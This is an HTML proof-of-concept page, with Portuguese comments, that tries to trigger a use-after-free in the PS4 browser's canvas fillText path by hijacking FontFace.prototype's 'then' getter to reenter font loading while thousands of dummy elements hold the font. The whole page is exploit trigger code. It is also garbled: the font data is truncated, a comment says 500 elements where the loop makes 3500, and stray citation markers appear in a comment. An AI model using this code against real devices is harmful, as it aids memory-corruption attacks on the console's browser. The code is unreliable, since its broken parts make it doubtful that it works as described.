
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - PS4 fillText FontMetrics UAF (drawTextInternal)</title>
</head>
<body>
<canvas id="c" width="200" height="200" style="display:none;"></canvas>
<script>
  let face = new FontFace('TestFont', 'url("data:font/woff;base64,d09GRgABAAAA...")'); // ou fonte local se preferir
  document.fonts.add(face);
  face.loaded;

  let canvas = document.getElementById('c');
  let ctx = canvas.getContext('2d');
  ctx.font = '10px TestFont';

  // Cria 500 elementos dummy para registrar FontSelectorClients e forçar o cascade
  let dummies = [];
  for (let i = 0; i < 3500; i++) {
      let d = document.createElement('div');
      d.style.font = '10px TestFont';
      document.body.appendChild(d);
      dummies.push(d);
  }

  let reentered = false;
  Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get() {
          if (reentered) return undefined;
          reentered = true;

          // Modifica o estado do documento / limpa o cache de fontes de forma reentrante
          document.fonts.add(new FontFace('Trigger', 'local(Arial)'));
          ctx.save();
          ctx.lineWidth = 5;
          ctx.restore();

          reentered = false;
          return undefined;
      }
  });

  // Dispara fillText que invoca drawTextInternal() no código nativo do PS4[span_2](start_span)[span_2](end_span)
  try {
      ctx.fillText("CrashTest", 10, 10);
  } catch (e) {
      console.error(e);
  }
</script>
</body>
</html>
